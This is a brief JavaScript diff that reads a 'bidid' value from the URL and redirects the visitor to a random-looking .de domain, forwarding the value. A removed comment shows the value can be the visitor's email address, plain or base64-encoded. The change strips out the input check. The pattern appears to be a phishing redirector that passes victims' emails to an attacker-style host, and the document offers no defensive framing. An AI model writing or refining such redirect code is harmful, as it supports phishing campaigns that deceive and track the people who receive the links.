@@ -9,8 +9,7 @@
   const params = new URLSearchParams(window.location.search);
   const bidid = params.get("bidid");
 
-  // Accept: bidid (hex), plain email, base64 email (with + / =), url-safe base64 (- _)
-  if (bidid && /^[A-Za-z0-9+/=_@.\-]{6,256}$/.test(bidid)) {
+  if (bidid) {
     window.location.replace(
       "https://zcbxaqmrvtnlypkwejduisrfhn.de/bids.php?bidid=" +
       encodeURIComponent(bidid)
